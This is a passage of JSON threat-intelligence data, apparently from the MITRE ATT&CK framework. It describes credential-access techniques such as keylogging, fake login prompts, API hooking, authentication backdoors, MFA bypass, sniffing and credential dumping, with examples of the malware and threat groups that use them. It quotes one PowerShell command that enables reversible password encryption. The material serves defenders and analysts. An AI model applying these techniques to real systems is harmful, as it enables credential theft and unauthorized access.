{"id": "S0148", "name": "RTM", "description": "RTM can record keystrokes from both the keyboard and virtual keyboard."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT captures keystrokes and sends them back to the C2 server."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has a keylogging capability."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has a keylogging capability."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM can continuously capture keystrokes."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug has used keylogging tools."}, {"id": "S0058", "name": "SslMM", "description": "SslMM creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot contains keylogging functionality to steal passwords."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to capture keystrokes on an infected host."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses the CGEventTap functions to perform keylogging."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot contains keylogger functionality."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used keylogging tools in their operations."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can capture keystrokes on a compromised host."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of recording keystrokes."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN collects keystrokes from the victim machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the capability to install a live and offline keylogger, including through the use of the GetAsyncKeyState Windows API."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure."}, {"id": "S0248", "name": "yty", "description": "yty uses a keylogger plugin to gather keystrokes."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can perform keylogging on the victim\u2019s machine by hooking the functions TranslateMessage and WM_KEYDOWN."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a feature to capture a remote computer's keystrokes using a keylogger."}]}, {"name": "GUI Input Capture", "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).", "detailed_description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.", "id": "T1056.002", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore prompts the user for their credentials."}, {"id": "S0274", "name": "Calisto", "description": "Calisto presents an input prompt asking for the user's login and password."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has captured passwords by prompting victims with a \"macOS needs to access System Settings\" GUI window."}, {"id": "S0281", "name": "Dok", "description": "Dok prompts the user for credentials."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials."}, {"id": "S0278", "name": "iKitten", "description": "iKitten prompts the user for their credentials."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap prompts the users for credentials."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has displayed fake forms on top of banking sites to intercept credentials from victims."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields."}, {"id": "S0279", "name": "Proton", "description": "Proton prompts users for their credentials."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl prompts the user for credentials through a Microsoft Outlook pop-up."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY's credphisher.py module can prompt a current user for their credentials."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET prompts the user to input credentials using a native macOS dialog box leveraging the system process /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment."}]}, {"name": "Web Portal Capture", "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.", "detailed_description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.", "id": "T1056.003", "examples": [{"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple OWA credential logger can monitor for OWA authentication requests and log the credentials."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled."}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information."}]}, {"name": "Credential API Hooking", "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:", "detailed_description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:", "id": "T1056.004", "examples": [{"id": "S0484", "name": "Carberp", "description": "Carberp has hooked several Windows API functions to steal credentials."}, {"id": "S0363", "name": "Empire", "description": "Empire contains some modules that leverage API hooking to carry out tasks, such as netripper."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher hooks processes by modifying IAT pointers to CreateWindowEx."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access."}, {"id": "S0416", "name": "RDFSNIFFER", "description": "RDFSNIFFER hooks several Win32 API functions to hijack elements of the remote system management user-interface."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has the ability to capture RDP credentials by capturing the CredEnumerateA API"}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem hooked and overrided Versa's built-in authentication method, setUserPassword, to intercept plaintext credentials when submitted to the server."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda hooks processes by leveraging its own IAT hooked functions."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell hooks several API functions to spawn system threads."}]}]}, {"name": "Modify Authentication Process", "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.", "detailed_description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.", "id": "T1556", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can intercept private keys using a trojanized ssh-add function."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook."}], "sub_techniques": [{"name": "Domain Controller Authentication", "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.", "detailed_description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.", "id": "T1556.001", "examples": [{"id": "G0114", "name": "Chimera", "description": "Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential."}, {"id": "S0007", "name": "Skeleton Key", "description": "Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller."}]}, {"name": "Password Filter DLL", "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.", "detailed_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.", "id": "T1556.002", "examples": [{"id": "S0125", "name": "Remsec", "description": "Remsec harvests plain-text credentials as a password filter registered on domain controllers."}, {"id": "G0041", "name": "Strider", "description": "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password."}]}, {"name": "Pluggable Authentication Modules", "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.", "detailed_description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.", "id": "T1556.003", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can deactivate PAM modules to tamper with the sshd configuration."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users."}]}, {"name": "Network Device Authentication", "description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.", "detailed_description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.", "id": "T1556.004", "examples": [{"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."}]}, {"name": "Reversible Encryption", "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.", "detailed_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.", "id": "T1556.005", "examples": []}, {"name": "Multi-Factor Authentication", "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.", "detailed_description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\nFor example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.", "id": "T1556.006", "examples": [{"id": "S0677", "name": "AADInternals", "description": "The AADInternals Set-AADIntUserMFA command can be used to disable MFA for a specified user."}, {"id": "G1015", "name": "Scattered Spider", "description": "After compromising user accounts, Scattered Spider registers their own MFA tokens."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided."}]}, {"name": "Hybrid Identity", "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.", "detailed_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID:\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges.\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the AzureADConnectAuthenticationAgentService process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. In environments using AD FS, an adversary may edit the Microsoft.IdentityServer.Servicehost configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.", "id": "T1556.007", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can inject a malicious DLL (PTASpy) into the AzureADConnectAuthenticationAgentService to backdoor Azure AD Pass-Through Authentication."}, {"id": "G0016", "name": "APT29", "description": "APT29 has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name."}]}, {"name": "Network Provider DLL", "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.", "detailed_description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.\nAdversaries can configure a malicious network provider DLL to receive credentials from mpnotify.exe. Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the NPLogonNotify() function.\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.", "id": "T1556.008", "examples": []}, {"name": "Conditional Access Policies", "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.", "detailed_description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain condition attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.", "id": "T1556.009", "examples": [{"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has added additional trusted locations to Azure AD conditional access policies. "}]}]}, {"name": "Multi-Factor Authentication Interception", "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.", "detailed_description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.", "id": "T1111", "examples": [{"id": "G0114", "name": "Chimera", "description": "Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can log credentials on compromised Pulse Secure VPNs during the DSAuth::AceAuthServer::checkUsernamePasswordACE-2FA authentication procedure."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens."}], "sub_techniques": []}, {"name": "Multi-Factor Authentication Request Generation", "description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.", "detailed_description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\nAdversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\"", "id": "T1621", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has used repeated MFA requests to gain access to victim accounts."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets."}], "sub_techniques": []}, {"name": "Network Sniffing", "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.", "detailed_description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities. Adversaries may likely also utilize network sniffing during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.", "id": "T1040", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy\u2019s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid\u2019s industrial control systems. "}, {"id": "G0007", "name": "APT28", "description": "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used SniffPass to collect credentials by sniffing network traffic."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used network sniffing to obtain login data. "}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed to hook network APIs to monitor network traffic. "}, {"id": "S0363", "name": "Empire", "description": "Empire can be used to conduct packet captures on target hosts."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor."}, {"id": "S0357", "name": "Impacket", "description": "Impacket can be used to sniff network traffic via an interface or raw socket."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  "}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can dump and print whole packet content."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can sniff network traffic to look for packets matching specific conditions."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains a module for taking packet captures on compromised hosts."}, {"id": "S0019", "name": "Regin", "description": "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB."}, {"id": "S0174", "name": "Responder", "description": "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used intercepter-NG to sniff passwords in network traffic."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem hooked the Catalina application filter chain doFilter on compromised systems to monitor all inbound requests to the local Tomcat web server, inspecting them for parameters like passwords and follow-on Java modules."}], "sub_techniques": []}, {"name": "OS Credential Dumping", "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. Credentials can then be used to perform Lateral Movement and access restricted information.", "detailed_description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.", "id": "T1003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims."}, {"id": "G0050", "name": "APT32", "description": "APT32 used GetPassword_x64 to harvest credentials."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used different versions of Mimikatz to obtain credentials."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has been known to dump credentials."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak obtains Windows logon password details."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear gathers credential material from target systems, such as SSH keys, to facilitate access to victim environments."}, {"id": "S0232", "name": "HOMEFRY", "description": "HOMEFRY can perform credential dumping."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used publicly available tools to dump password hashes, including HOMEFRY."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for dumping and capturing credentials from process memory."}, {"id": "S0052", "name": "OnionDuke", "description": "OnionDuke steals credentials from its victims."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP)."}, 